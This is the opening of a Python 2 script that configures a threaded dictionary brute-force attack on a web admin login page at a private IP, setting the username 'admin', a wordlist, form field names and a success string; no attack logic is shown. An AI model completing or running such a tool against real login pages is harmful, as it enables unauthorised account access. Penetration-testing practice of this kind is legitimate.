import Queue
import threading
import urllib
import urllib2
import cookielib
import sys

from HTMLParser import HTMLParser

user_thread = 10
username = "admin"
wordlist_file = "tmp/dictionary.txt"
resume = None

target_url = "http://192.168.0.1/administrator/index.php"
target_post = "http://192.168.0.1/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

